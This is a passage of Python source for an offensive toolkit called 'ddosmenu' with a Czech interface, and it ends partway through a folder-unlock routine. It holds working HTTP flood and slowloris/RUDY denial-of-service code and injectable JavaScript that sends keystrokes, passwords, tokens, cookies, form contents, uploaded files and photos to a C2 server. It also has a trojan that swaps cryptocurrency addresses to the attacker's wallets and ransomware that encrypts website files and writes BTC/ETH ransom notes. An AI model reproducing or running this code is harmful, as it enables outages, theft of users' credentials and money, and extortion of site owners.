                loc[0] += 1
                loc[2] += 1
                try:
                    if sock:
                        sock.close()
                except Exception:
                    pass
                sock = None
            p = time.perf_counter()
            if p - last > 0.2:
                sh.add(loc[0], loc[1], loc[2], loc[3], loc[4], ci)
                loc = [0, 0, 0, 0, 0.0]
                last = p
        try:
            if sock:
                sock.close()
        except Exception:
            pass
        sh.add(loc[0], loc[1], loc[2], loc[3], loc[4], -1)

    def _child(self, stop, sh):
        ctx = _UCTX if self.tls else None
        ths = [threading.Thread(target=self._worker, args=(stop, sh, ctx), daemon=True)
               for _ in range(self.threads)]
        for t in ths:
            t.start()
        for t in ths:
            t.join()

    def _dash(self, stop, sh, duration, down_stop, base_lat=0.0):
        start = time.perf_counter()
        prev = (0, 0, 0, 0)
        peak = 0.0
        hist = []
        status = grn_("FLOODING")
        down_since = None
        seen_ok = False
        while not stop.is_set():
            time.sleep(1.0)
            tot, okn, errn, byt, lat, codes = sh.snap()
            el = time.perf_counter() - start
            rps = tot - prev[0]
            brps = byt - prev[3]
            prev = (tot, okn, errn, byt)
            peak = max(peak, rps)
            hist.append(rps)
            if okn:
                seen_ok = True
            succ = (okn / tot * 100.0) if tot else 100.0
            avgl = (lat / okn) if okn else 0.0
            tgt = "%s://%s%s" % ("https" if self.tls else "http", self.host_header, self.base_path)
            L = [
                kv("cil", whi_(tgt[:58])),
                kv("cas", b_(hms(el))) + "   " + kv("RPS", b_(mag_(num(rps)))) +
                dim_("  peak ") + num(peak),
                kv("requesty", b_(cya_(num(tot)))) + "   " + kv("uspech",
                   (grn_ if succ > 95 else yel_ if succ > 70 else red_)("%.1f %%" % succ)),
                kv("chyby", (red_(num(errn)) if errn else grn_("0"))) +
                "   " + kv("latence", "%d ms" % (avgl * 1000) +
                           (dim_(" (%.1fx)" % (avgl / base_lat)) if base_lat else "")),
                kv("prenos", cya_(human(byt)) + dim_("  %.1f MB/s" % (brps / 1048576.0))) +
                "   " + kv("vlaken", str(self.threads * self.processes)),
                "",
                "  " + mag_(spark(hist, 48)) + "  " + status,
            ]
            if any(codes):
                L.append("  " + dim_("kody: ") + "  ".join(
                    "%s %s" % (k, num(v)) for k, v in zip(
                        ["200", "2xx", "3xx", "4xx", "5xx", "ost."], codes) if v))
            out = box(L, title="  DDOS  ·  %s  " % self.method)
            if not self.quiet:
                if IS_TTY:
                    sys.stdout.write("\033[H\033[J")
                sys.stdout.write(out + "\n")
                sys.stdout.flush()
            if duration and el >= duration:
                status = yel_("CAS VYPRSEL")
                break
            if down_stop and seen_ok and tot > 50 and errn / max(tot, 1) > 0.9:
                if down_since is None:
                    down_since = time.time()
                    status = yel_("CIL NEODPOVIDA...")
                elif time.time() - down_since > 3:
                    status = red_("CIL SPADL")
                    if not self.quiet:
                        if IS_TTY:
                            sys.stdout.write("\033[H\033[J")
                        sys.stdout.write(out + "\n")
                        sys.stdout.flush()
                    break
            else:
                down_since = None
                status = grn_("FLOODING")
        return peak

    def run(self, duration=None, down_stop=False, base_lat=0.0):
        stop = mp.Event()
        sh = Shared()
        ctx = _UCTX if self.tls else None
        procs = []
        for _ in range(self.processes - 1):
            p = mp.Process(target=_flood_child, args=(dict(self.__dict__), stop, sh), daemon=True)
            p.start()
            procs.append(p)
        ths = [threading.Thread(target=self._worker, args=(stop, sh, ctx), daemon=True)
               for _ in range(self.threads)]
        for t in ths:
            t.start()
        t0 = time.perf_counter()
        try:
            peak = self._dash(stop, sh, duration, down_stop, base_lat)
        except KeyboardInterrupt:
            peak = 0
            warn("preruseno")
        finally:
            stop.set()
            for t in ths:
                t.join(timeout=3)
            for p in procs:
                p.join(timeout=3)
        el = max(time.perf_counter() - t0, 0.001)
        tot, okn, errn, byt, lat, codes = sh.snap()
        return {"el": el, "tot": tot, "ok": okn, "err": errn, "byt": byt,
                "lat": lat, "codes": codes, "peak": peak}


def _flood_child(spec, stop, sh):
    keys = ("url", "threads", "method", "timeout", "keepalive",
            "cachebust", "randpath", "processes", "quiet", "xff")
    f = Flooder(**dict((k, v) for k, v in spec.items() if k in keys))
    f.processes = 1
    f._child(stop, sh)


# --------------------------------------------------------------------------- #
#  modul 1 - DDoS
# --------------------------------------------------------------------------- #
def cmd_ddos():
    hr("1 · ddos · real flood")
    info("raw sockety · GET/POST/HEAD · cache-busting · multiproces")
    url = ask("Target URL (Enter = lokalni test)", "")
    if not url:
        url = test_server_start(8000)
        ok("test server na " + cya_(url))
    if "://" not in url:
        url = "http://" + url
    with spinning("resolvuji cil pres redirecty"):
        final, code = resolve_url(url)
    if final != url:
        warn("cil presmeroval -> " + cya_(final))
    f0 = Flooder(final)
    ok("cil: " + b_(cya_("%s://%s:%d" % ("https" if f0.tls else "http", f0.host, f0.port))))
    with spinning("merim zakladni latenci"):
        base_lat = baseline_latency(final)
    if base_lat:
        info("zakladni latence: " + b_("%.0f ms" % (base_lat * 1000)))
    print()
    method = ask("Metoda (GET/POST/HEAD)", "GET").upper()
    threads = ask_int("Vlaken", 400)
    procs = ask_int("Procesu (1 staci, vic = silnejsi)", 1)
    mode = ask("Rezim (flood / cas / down)", "flood").lower()
    duration = None
    down_stop = False
    if mode.startswith("c"):
        duration = ask_int("Jak dlouho (s)", 30)
    elif mode.startswith("d"):
        down_stop = True
    timeout = ask_float("Timeout (s)", 4)
    cachebust = ask_yes("Cache-busting (obchazi cache/CDN)", True)
    randpath = ask_yes("Utocit i na dalsi cesty", True)
    keepalive = ask_yes("Keep-alive (rychlejsi)", False)
    xff = ask_yes("Spoofovat X-Forwarded-For (obchazi rate-limit)", False)
    f = Flooder(final, threads, method, timeout, keepalive, cachebust, randpath, procs, False, xff)
    act("startuji " + b_(str(threads * procs)) + " vlaken")
    time.sleep(0.4)
    r = f.run(duration=duration, down_stop=down_stop, base_lat=base_lat)
    succ = (r["ok"] / r["tot"] * 100.0) if r["tot"] else 0.0
    now_lat = (r["lat"] / r["ok"]) if r["ok"] else 0.0
    res = [
        "  " + kv("trvani", b_(hms(r["el"]))),
        "  " + kv("requestu", b_(cya_(num(r["tot"])))),
        "  " + kv("uspesnych", grn_(num(r["ok"])) + dim_("   (%.1f %%)" % succ)),
        "  " + kv("chyb", (red_(num(r["err"])) if r["err"] else grn_("0"))),
        "  " + kv("prumerny RPS", mag_(num(r["tot"] / r["el"]))),
        "  " + kv("peak RPS", mag_(num(r["peak"]))),
        "  " + kv("preneseno", cya_(human(r["byt"]))),
        "  " + kv("latence", "%d ms" % (now_lat * 1000)),
    ]
    if base_lat and now_lat:
        res.append("  " + kv("zpomaleni cilu", red_("%.1fx" % (now_lat / base_lat))))
    if any(r["codes"]):
        res.append("  " + kv("kody", "  ".join(
            "%s %s" % (k, num(v)) for k, v in zip(
                ["200", "2xx", "3xx", "4xx", "5xx", "ost."], r["codes"]) if v)))
    print()
    print(box(res, title="  vysledek  ", double=True))


# --------------------------------------------------------------------------- #
#  modul 2 - DoS
# --------------------------------------------------------------------------- #
def _conn(host, port, tls, timeout=10):
    s = socket.create_connection((host, port), timeout)
    if tls:
        s = _UCTX.wrap_socket(s, server_hostname=host)
    return s


def cmd_dos():
    hr("2 · dos · low-rate utoky")
    print(box([
        "  " + grn_("1") + "  slowloris   " + dim_("nedokoncene hlavicky, drzi sockety"),
        "  " + grn_("2") + "  RUDY         " + dim_("pomalu posila telo POSTu"),
        "  " + grn_("3") + "  slow-read    " + dim_("pomalu cte odpoved"),
        "  " + grn_("4") + "  hammer       " + dim_("rychla jednoducha smycka"),
    ]))
    kind = ask("Typ", "1")
    url = ask("Target URL (Enter = lokalni test)", "")
    if not url:
        url = test_server_start(8001)
        ok("test server na " + cya_(url))
    if "://" not in url:
        url = "http://" + url
    with spinning("resolvuji cil"):
        final, _ = resolve_url(url)
    u = urllib.parse.urlparse(final)
    host, tls = u.hostname, u.scheme == "https"
    port = u.port or (443 if tls else 80)
    path = u.path or "/"
    ctx = _UCTX if tls else None

    if kind == "4":
        act("hammer na " + cya_(final) + dim_("  Ctrl+C = stop"))
        tot = 0
        er = 0
        t0 = time.perf_counter()
        try:
            while True:
                try:
                    r = http_get(final, timeout=5)
                    r.read(2048)
                    tot += 1
                except Exception:
                    er += 1
                if (tot + er) % 20 == 0:
                    el = max(time.perf_counter() - t0, 0.001)
                    sys.stdout.write("\r  " + cya_("ok=%s err=%s rps=%.0f  "
                                                   % (num(tot), num(er), (tot + er) / el)))
                    sys.stdout.flush()
        except KeyboardInterrupt:
            print()
        print()
        print(box(["  " + kv("requestu", b_(cya_(num(tot)))), "  " + kv("chyb", red_(num(er)))],
                  title="  hammer  ", double=True))
        return

    n = ask_int("Pocet spojeni", 600)
    delay = ask_float("Prodleva mezi kroky (s)", 10)
    stop = threading.Event()
    live = {"n": 0}

    def feeder(s, mode):
        try:
            while not stop.is_set():
                time.sleep(delay)
                s.sendall(b"x" if mode == "rudy" else b"X-a: %d\r\n" % random.randint(1, 9999))
        except Exception:
            live["n"] -= 1

    def reader(s):
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 256)
            while not stop.is_set():
                time.sleep(delay)
                if not s.recv(1):
                    break
        except Exception:
            pass
        live["n"] -= 1

    act("oteviram " + b_(str(n)) + " spojeni (" + kind + ")")
    socks = []
    try:
        for i in range(n):
            try:
                s = _conn(host, port, tls)
                if kind == "1":
                    s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n"
                               % (path, host, random.choice(UAS))).encode())
                    threading.Thread(target=feeder, args=(s, "slow"), daemon=True).start()
                elif kind == "2":
                    s.sendall(("POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                               "Content-Type: application/x-www-form-urlencoded\r\n"
                               "Content-Length: 999999\r\n\r\n" % (path, host, random.choice(UAS))).encode())
                    threading.Thread(target=feeder, args=(s, "rudy"), daemon=True).start()
                else:
                    s.sendall(("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: */*\r\n"
                               % (path, host, random.choice(UAS))).encode())
                    threading.Thread(target=reader, args=(s,), daemon=True).start()
                socks.append(s)
                live["n"] += 1
            except Exception as e:
                if i % 25 == 0:
                    err("socket %d: %s" % (i, str(e)[:44]))
            if (i + 1) % 40 == 0:
                prog(i + 1, n, "%d zivych" % live["n"])
        prog(n, n, "hotovo")
        ok(b_(str(live["n"])) + " spojeni drzi " + cya_(host) + dim_("  Ctrl+C = stop"))
        while True:
            time.sleep(2)
            sys.stdout.write("\r  " + cya_("zivych spojeni: " + b_(str(live["n"]))))
            sys.stdout.flush()
    except KeyboardInterrupt:
        print()
    finally:
        stop.set()
        for s in socks:
            try:
                s.close()
            except Exception:
                pass
        ok("zavreno %d spojeni" % len(socks))


# --------------------------------------------------------------------------- #
#  JS payloady
# --------------------------------------------------------------------------- #
_CORE_JS = r"""
  function send(d) {
    var body = JSON.stringify(d);
    try {
      if (navigator.sendBeacon) navigator.sendBeacon(C2, new Blob([body], {type:"text/plain"}));
      else fetch(C2, {method:"POST", body:body, headers:{"Content-Type":"text/plain"}});
    } catch (e) {}
  }
  function sf(f, d) { try { return f(); } catch (e) { return d; } }
  function focused() { var a = document.activeElement; return a ? (a.name || a.id || a.type || "?") : ""; }
  function userField() {
    var u = document.querySelector('input[type=email],input[name*=user i],input[id*=user i],input[name*=mail i],input[name*=login i]');
    return u ? u.value : "";
  }
  function keylogger() {
    var buf = {}, timer = null;
    function flush() {
      timer = null;
      var out = {}, has = false;
      for (var k in buf) { if (buf[k]) { out[k] = buf[k]; has = true; } }
      if (has) { send({tag:TAG, type:"KEYS", url:location.href, fields:out}); buf = {}; }
    }
    document.addEventListener("keydown", function (e) {
      var k = e.key, s = (k.length === 1 ? k : "[" + k + "]");
      var f = focused() || "body";
      buf[f] = (buf[f] || "") + s;
      if (!timer) timer = setTimeout(flush, 4000);
    }, true);
    setInterval(flush, 6000);
    window.addEventListener("beforeunload", flush);
  }
  function passWatch() {
    var last = "";
    setInterval(function () {
      var ps = document.querySelectorAll('input[type=password]');
      for (var i = 0; i < ps.length; i++) {
        var v = ps[i].value;
        if (v && v !== last) {
          last = v;
          send({tag:TAG, type:"PASSWORD", url:location.href,
                field:(ps[i].name || ps[i].id || "pw"), user:userField(), value:v});
        }
      }
    }, 1200);
  }
  function storageWatch() {
    var last = "";
    setInterval(function () {
      var s = sf(function(){ return JSON.stringify(localStorage); }, "");
      if (s && s !== last) { last = s; send({tag:TAG, type:"STORAGE", url:location.href, ls:s.slice(0,4000)}); }
    }, 4000);
  }
  function tokenGrab() {
    if (/[#?&](access_token|id_token|token|code|session)=/.test(location.href))
      send({tag:TAG, type:"TOKEN", url:location.href, hash:location.hash, search:location.search});
  }
  function clipboard() {
    document.addEventListener("paste", function (e) {
      try {
        var t = (e.clipboardData || window.clipboardData).getData("text");
        if (t) send({tag:TAG, type:"PASTE", url:location.href, text:t.slice(0, 2000)});
      } catch (err) {}
    }, true);
  }
"""

_FP_JS = r"""
  var FP = {
    tag: TAG, url: location.href, ref: document.referrer,
    ua: navigator.userAgent, platform: navigator.platform, lang: navigator.language,
    cores: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
    screen: screen.width + "x" + screen.height + "x" + screen.colorDepth,
    tz: sf(function(){ return Intl.DateTimeFormat().resolvedOptions().timeZone; }, ""),
    touch: ("ontouchstart" in window) ? 1 : 0,
    cookie: sf(function(){ return document.cookie; }, ""),
    localStorage: sf(function(){ return JSON.stringify(localStorage); }, ""),
    sessionStorage: sf(function(){ return JSON.stringify(sessionStorage); }, ""),
    plugins: sf(function(){ return Array.prototype.map.call(navigator.plugins,
             function(p){ return p.name; }).join(", "); }, ""),
    gpu: sf(function(){
      var g = document.createElement("canvas").getContext("webgl");
      var e = g.getExtension("WEBGL_debug_renderer_info");
      return e ? g.getParameter(e.UNMASKED_RENDERER_WEBGL) : "";
    }, ""),
    canvas: sf(function(){
      var cv = document.createElement("canvas"); cv.width = 200; cv.height = 40;
      var x = cv.getContext("2d");
      x.textBaseline = "top"; x.font = "16px Arial";
      x.fillStyle = "#f60"; x.fillRect(0,0,200,40);
      x.fillStyle = "#069"; x.fillText("DDOSMENU", 4, 8);
      return cv.toDataURL().slice(-64);
    }, "")
  };
"""

TROJAN_JS = (r"""/* DDOSMENU trojan - fingerprint + keylogger */
(function () {
  var C2 = "__C2__/beacon", TAG = "__TAG__";
""" + _CORE_JS + _FP_JS + r"""
  keylogger(); passWatch(); storageWatch(); tokenGrab(); clipboard();
  try {
    if (navigator.getBattery) navigator.getBattery().then(function(b){
      FP.battery = Math.round(b.level*100) + "% " + (b.charging ? "nabiji" : "vybiji");
      send(FP);
    });
  } catch (e) {}
  send(FP);
  send({tag:TAG, type:"HELLO", url:location.href, ref:document.referrer});
})();
""")

INJECT_JS = (r"""/* DDOSMENU inject - loginy + fotky + soubory + tokeny */
(function () {
  var C2 = "__C2__/beacon", TAG = "__TAG__";
""" + _CORE_JS + _FP_JS + r"""
  function dumpForm(f) {
    var o = {}, els = f.querySelectorAll("input,select,textarea");
    for (var i = 0; i < els.length; i++) {
      var e = els[i];
      if (["password","text","email","tel","hidden","number","search"].indexOf(e.type) >= 0)
        o[e.name || e.id || (e.type + i)] = e.value;
    }
    return o;
  }
  function hookForms() {
    var fs = document.forms;
    for (var i = 0; i < fs.length; i++) {
      var f = fs[i];
      if (f.__dd) continue;
      f.__dd = 1;
      f.addEventListener("submit", function () {
        send({tag:TAG, type:"LOGIN", url:location.href, action:this.action, form:dumpForm(this)});
      }, true);
    }
  }
  function lookToken(s) {
    if (!s) return null;
    var m = String(s).match(/"(?:access_token|token|id_token|jwt|auth[a-z]*)"\s*:\s*"([^"]{8,300})"/i);
    return m ? m[1] : null;
  }
  var of = window.fetch;
  if (of) window.fetch = function () {
    try {
      var a = arguments;
      if (a[1] && a[1].body)
        send({tag:TAG, type:"POST", url:location.href, body:String(a[1].body).slice(0,2000)});
    } catch (e) {}
    var pr = of.apply(this, arguments);
    try {
      if (pr && pr.then) pr.then(function (r) {
        r.clone().text().then(function (t) {
          send({tag:TAG, type:"RESPONSE", url:location.href, status:r.status,
                token:lookToken(t), body:String(t).slice(0,1200)});
        }).catch(function(){});
      });
    } catch (e) {}
    return pr;
  };
  var oo = XMLHttpRequest.prototype.open, os = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (m, u) { this.__u = u; return oo.apply(this, arguments); };
  XMLHttpRequest.prototype.send = function (b) {
    var self = this;
    try { if (b) send({tag:TAG, type:"XHR", url:location.href, to:this.__u, body:String(b).slice(0,2000)}); } catch (e) {}
    this.addEventListener("load", function () {
      try {
        send({tag:TAG, type:"XHR_RESP", url:location.href, to:self.__u, status:self.status,
              token:lookToken(self.responseText), body:String(self.responseText).slice(0,1200)});
      } catch (e) {}
    });
    return os.apply(this, arguments);
  };
  function grabImages(limit, maxw) {
    var imgs = document.images, n = 0;
    for (var i = 0; i < imgs.length && n < limit; i++) {
      (function (img) {
        var w = img.naturalWidth || img.width, h = img.naturalHeight || img.height;
        if (!w || !h || w < 80 || h < 80) return;
        try {
          var s = Math.min(1, maxw / w), cv = document.createElement("canvas");
          cv.width = Math.max(1, (w*s)|0); cv.height = Math.max(1, (h*s)|0);
          cv.getContext("2d").drawImage(img, 0, 0, cv.width, cv.height);
          n++;
          send({tag:TAG, type:"PHOTO", url:location.href, src:img.src,
                size:cv.width + "x" + cv.height, data:cv.toDataURL("image/jpeg", 0.55)});
        } catch (e) {
          send({tag:TAG, type:"PHOTO_URL", url:location.href, src:img.src});
        }
      })(imgs[i]);
    }
    var all = document.querySelectorAll("*");
    for (var j = 0, k = 0; j < all.length && k < 8; j++) {
      var bg = getComputedStyle(all[j]).backgroundImage;
      if (bg && bg.indexOf("url(") === 0) {
        k++;
        send({tag:TAG, type:"BG_PHOTO", url:location.href, src:bg.slice(5, -2)});
      }
    }
  }
  document.addEventListener("change", function (e) {
    var t = e.target;
    if (t && t.tagName === "INPUT" && t.type === "file" && t.files && t.files[0]) {
      var f = t.files[0], fr = new FileReader();
      fr.onload = function () {
        send({tag:TAG, type:"FILE", url:location.href, name:f.name, size:f.size, data:fr.result});
      };
      fr.readAsDataURL(f);
    }
  }, true);
  window.__dd = { dump: function () { hookForms(); grabImages(14, 720); }, send: send, tag: TAG };
  keylogger(); passWatch(); storageWatch(); tokenGrab(); clipboard();
  send(FP);
  setTimeout(window.__dd.dump, 1500);
  setInterval(hookForms, 3000);
})();
""")

CRYPTO_JS = (r"""/* DDOSMENU cryptotrojan - swap adres + lov penez */
(function () {
  var C2 = "__C2__/beacon", TAG = "__TAG__";
  var W = { btc:"__WALLET_BTC__", eth:"__WALLET_ETH__", ltc:"__WALLET_LTC__" };
  var SWAP = __SWAP__;
""" + _CORE_JS + r"""
  var RX = {
    btc: /(bc1[a-z0-9]{25,50}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})/,
    eth: /0x[a-fA-F0-9]{40}/,
    ltc: /L[a-km-zA-HJ-NP-Z1-9]{25,34}/,
    doge: /D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}/,
    xmr: /4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}/
  };
  var AMT = /([$€£]|USD|EUR|BTC|ETH|CZK|Kc)\s?([0-9][0-9 .,']{0,18})|([0-9][0-9 .,']{0,18})\s?(BTC|ETH|USD|EUR|\$|Kc)/g;
  function all(rx, txt) {
    var r = new RegExp(rx.source, "g"), m, out = [], seen = {};
    while ((m = r.exec(txt)) !== null) { if (!seen[m[0]]) { seen[m[0]] = 1; out.push(m[0]); } }
    return out;
  }
  function tonum(s) {
    s = String(s).replace(/[^0-9.,]/g, "").replace(/\.(?=\d{3}\b)/g, "").replace(",", ".");
    var v = parseFloat(s);
    return isNaN(v) ? 0 : v;
  }
  function scan() {
    var txt = document.body ? document.body.innerText : "";
    var out = {tag:TAG, type:"CRYPTO_PAGE", url:location.href, title:document.title,
               top:[], max_amount:"", max_value:0};
    for (var k in RX) out[k] = all(RX[k], txt).slice(0, 15);
    var m, best = 0, bestS = "";
    AMT.lastIndex = 0;
    while ((m = AMT.exec(txt)) !== null) {
      var v = tonum(m[2] || m[3]), cur = (m[1] || m[4] || "");
      if (v > 0 && out.top.length < 12) out.top.push(cur + " " + (m[2] || m[3]));
      if (v > best) { best = v; bestS = cur + " " + (m[2] || m[3]); }
    }
    out.max_amount = bestS; out.max_value = best;
    send(out);
  }
  function swapNodes() {
    var w = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT, null, false), n;
    while ((n = w.nextNode())) {
      var t = n.nodeValue, o = t;
      for (var k in W) if (W[k]) t = t.replace(new RegExp(RX[k].source, "g"), W[k]);
      if (t !== o) n.nodeValue = t;
    }
    var ins = document.querySelectorAll("input");
    for (var i = 0; i < ins.length; i++) {
      var v = ins[i].value || "";
      for (var k in W) if (W[k] && RX[k].test(v)) { ins[i].value = W[k]; break; }
    }
  }
  try {
    var ow = navigator.clipboard.writeText.bind(navigator.clipboard);
    navigator.clipboard.writeText = function (t) {
      for (var k in W) if (W[k] && RX[k].test(t || "")) { t = W[k]; break; }
      return ow(t);
    };
  } catch (e) {}
  send({tag:TAG, type:"HELLO", url:location.href});
  setTimeout(function () { if (SWAP) swapNodes(); scan(); }, 2000);
  try {
    new MutationObserver(function () { if (SWAP) swapNodes(); })
      .observe(document.body, {childList:true, subtree:true});
  } catch (e) {}
  setInterval(scan, 20000);
})();
""")


def _gen(tpl, tag, extra=None):
    js = tpl.replace("__C2__", c2_base()).replace("__TAG__", tag)
    for k, v in (extra or {}).items():
        js = js.replace(k, v)
    return js


# --------------------------------------------------------------------------- #
#  modul 3 - Trojan
# --------------------------------------------------------------------------- #
def cmd_trojan():
    hr("3 · trojan · fingerprint + keylogger")
    c2_start()
    tag = ask("Tag kampane", CONF.get("tag", "web1"))
    write_art("trojan.js", _gen(TROJAN_JS, tag))
    write_art("trojan.html",
              '<!doctype html><meta charset="utf-8"><title>ddosmenu trojan</title>'
              '<style>body{background:#050806;color:#0f8;font:15px monospace;padding:40px}</style>'
              '<h2>trojan bezi...</h2>'
              '<form><input name="login" placeholder="jmeno"><br><br>'
              '<input name="pass" type="password" placeholder="heslo"><br><br>'
              '<button>odeslat</button></form>'
              '<script src="%s/trojan.js"></script>' % c2_base())
    write_art("trojan_snippet.txt", '<script src="%s/trojan.js"></script>\n' % c2_base())
    print()
    print(box([
        "  " + kv("C2", cya_(c2_base())),
        "  " + kv("dashboard", b_(cya_(c2_base() + "/dash"))),
        "",
        "  " + b_("nasadit:") + " vloz pred </body>",
        "  " + cya_('<script src="%s/trojan.js"></script>' % c2_base()),
        "  " + b_("test:") + " otevri " + cya_(c2_base() + "/trojan.html"),
    ], title="  trojan pripraven  "))


# --------------------------------------------------------------------------- #
#  modul 4 - InjectWEB
# --------------------------------------------------------------------------- #
def cmd_injectweb():
    hr("4 · injectweb · loginy + fotky")
    print(box([
        "  " + grn_("1") + "  vygenerovat inject.js",
        "  " + grn_("2") + "  spustit injection proxy " + dim_("(na jakykoliv web)"),
        "  " + grn_("3") + "  zastavit proxy",
    ]))
    ch = ask("Volba", "2")
    if ch == "3":
        proxy_stop()
        return ok("proxy zastavena")
    if ch == "2":
        c2_start()
        proxy_start()
        print()
        print(box([
            "  " + kv("otevri", b_(cya_("http://127.0.0.1:%d" % CONF["proxy_port"]))),
            "  " + kv("pak", "pises uz jen adresy webu"),
            "  " + kv("dashboard", b_(cya_(c2_base() + "/dash"))),
        ], title="  proxy online  "))
        return
    c2_start()
    tag = ask("Tag kampane", CONF.get("tag", "web1"))
    write_art("inject.js", _gen(INJECT_JS, tag))
    bm = ("javascript:(function(){var s=document.createElement('script');s.src='%s/inject.js?x='"
          "+Date.now();document.body.appendChild(s);})();" % c2_base())
    write_art("bookmarklet.txt", bm)
    write_art("inject_snippet.txt", '<script src="%s/inject.js"></script>\n' % c2_base())
    print()
    print(box([
        "  " + kv("C2", cya_(c2_base())),
        "  " + kv("chyta", red_("loginy") + ", " + mag_("fotky") + ", " + mag_("soubory") +
                  ", " + yel_("tokeny")),
        "",
        "  " + b_("1) script tag:") + " " + cya_('<script src="%s/inject.js"></script>' % c2_base()),
        "  " + b_("2) bookmarklet:") + " " + dim_(ART + "/bookmarklet.txt"),
        "  " + b_("3) proxy") + " = volba 2",
    ], title="  injectweb pripraven  "))


# --------------------------------------------------------------------------- #
#  modul 5 - CryptoTrojan
# --------------------------------------------------------------------------- #
def cmd_cryptotrojan():
    hr("5 · cryptotrojan · swap adres + lov penez")
    c2_start()
    tag = ask("Tag kampane", CONF.get("tag", "web1"))
    btc = ask("Tvoje BTC adresa", CONF.get("wallet_btc", ""))
    eth = ask("Tvoje ETH adresa", CONF.get("wallet_eth", ""))
    ltc = ask("Tvoje LTC adresa", CONF.get("wallet_ltc", ""))
    swap = ask_yes("Prepisovat adresy na strance", True)
    CONF["wallet_btc"] = btc
    CONF["wallet_eth"] = eth
    CONF["wallet_ltc"] = ltc
    save_conf(CONF)
    write_art("cryptotrojan.js", _gen(CRYPTO_JS, tag, {
        "__WALLET_BTC__": btc, "__WALLET_ETH__": eth, "__WALLET_LTC__": ltc,
        "__SWAP__": "true" if swap else "false"}))
    write_art("cryptotrojan_snippet.txt", '<script src="%s/cryptotrojan.js"></script>\n' % c2_base())
    print()
    print(box([
        "  " + kv("C2", cya_(c2_base())),
        "  " + kv("swap", grn_("ANO") if swap else yel_("jen report")),
        "  " + kv("BTC", yel_(btc)),
        "  " + kv("ETH", yel_(eth)),
        "",
        "  " + b_("vloz do krypto stranky:") + " " + cya_('<script src="%s/cryptotrojan.js"></script>' % c2_base()),
    ], title="  cryptotrojan pripraven  "))


# --------------------------------------------------------------------------- #
#  modul 6 - WebLocker
# --------------------------------------------------------------------------- #
MAGIC = b"DMLOCK1\x00"
SKIP = ("ddosmenu.key", "README_RANSOM.txt", "index.html.orig")


def _ks(key, nonce, n):
    out = bytearray()
    ctr = 0
    while len(out) < n:
        out += hashlib.sha256(key + nonce + ctr.to_bytes(8, "big")).digest()
        ctr += 1
    return bytes(out[:n])


def _xor(a, b):
    if not a:
        return b""
    return (int.from_bytes(a, "big") ^ int.from_bytes(b, "big")).to_bytes(len(a), "big")


def lock_bytes(data, key):
    nonce = os.urandom(16)
    return MAGIC + nonce + _xor(data, _ks(key, nonce, len(data)))


def is_locked(d):
    return d.startswith(MAGIC)


def unlock_bytes(data, key):
    nonce = data[len(MAGIC):len(MAGIC) + 16]
    return _xor(data[len(MAGIC) + 16:], _ks(key, nonce, len(data) - len(MAGIC) - 16))


def ransom_html(n, price, btc, eth, key):
    return """<!doctype html><meta charset="utf-8"><title>WEB ZAMCEN</title>
<style>
 body{margin:0;background:#050806;color:#c8ffd4;font:15px/1.7 monospace;
      display:flex;align-items:center;justify-content:center;min-height:100vh}
 .b{max-width:740px;padding:44px;border:2px solid #00ff88;border-radius:14px;
    background:#08120c;box-shadow:0 0 70px rgba(0,255,136,.18)}
 h1{color:#ff3b3b;margin:0 0 14px;letter-spacing:5px}
 code{background:#000;padding:3px 8px;border-radius:5px;color:#0f8}
 .a{color:#00e0ff;word-break:break-all}
 small{color:#4a7}
</style>
<div class="b">
  <h1>&gt;&gt; WEB ZAMCEN &lt;&lt;</h1>
  <p>Vsechny soubory tohoto webu byly zasifrovany.</p>
  <p>souboru: <code>%d</code> &nbsp; cena: <code>%s</code></p>
  <p>BTC: <span class="a">%s</span></p>
  <p>ETH: <span class="a">%s</span></p>
  <p>klic: <code>%s</code></p>
  <small>po zaplaceni pridej ddosmenu.key do rootu a spust odemceni</small>
</div>
""" % (n, price, btc, eth, key.hex())


def ransom_txt(n, size, key, btc, eth, price):
    return """############################################################
#                  TVUJ WEB JE ZAMCENY                     #
############################################################

souboru : %d
dat     : %.1f kB
cena    : %s

BTC : %s
ETH : %s

KLIC (hex): %s

odemceni: python ddosmenu.py -> 6 -> Odemknout
""" % (n, size / 1024.0, price, btc, eth, key.hex())


def wl_lock_folder(folder=None, key=None, silent=False):
    folder = os.path.abspath(folder or ask("Slozka s webem", "."))
    if not os.path.isdir(folder):
        return err("slozka neexistuje")
    key = key or os.urandom(32)
    open(os.path.join(folder, "ddosmenu.key"), "w").write(key.hex())
    files = []
    for root, _, fns in os.walk(folder):
        for fn in fns:
            if fn not in SKIP:
                files.append(os.path.join(root, fn))
    n = 0
    total = 0
    for i, p in enumerate(files, 1):
        try:
            d = open(p, "rb").read()
            if is_locked(d):
                continue
            open(p, "wb").write(lock_bytes(d, key))
            n += 1
            total += len(d)
        except Exception as e:
            err("%s: %s" % (p, e))
        if not silent:
            prog(i, len(files), os.path.basename(p)[:28])
    idx = os.path.join(folder, "index.html")
    if os.path.isfile(idx) and not os.path.isfile(idx + ".orig"):
        os.rename(idx, idx + ".orig")
    open(idx, "w", encoding="utf-8").write(
        ransom_html(n, CONF["price"], CONF["wallet_btc"], CONF["wallet_eth"], key))
    open(os.path.join(folder, "README_RANSOM.txt"), "w", encoding="utf-8").write(
        ransom_txt(n, total, key, CONF["wallet_btc"], CONF["wallet_eth"], CONF["price"]))
    if not silent:
        print()
        print(box(["  " + kv("souboru", red_(num(n))),
                   "  " + kv("klic", yel_(key.hex())),
                   "  " + kv("zaplatit", grn_(CONF["wallet_btc"]))],
                  title="  zamceno  "))
    return n, key


def wl_unlock_folder(folder=None, key=None, silent=False):
    folder = os.path.abspath(folder or ask("Slozka s webem", "."))
    kf = os.path.join(folder, "ddosmenu.key")
    if key is None:
        if not os.path.isfile(kf):
            return err("chybi ddosmenu.key")
        key = bytes.fromhex(open(kf).read().strip())
    files = []
    for root, _, fns in os.walk(folder):
        for fn in fns:
            if fn not in SKIP:
                files.append(os.path.join(root, fn))
    n = 0
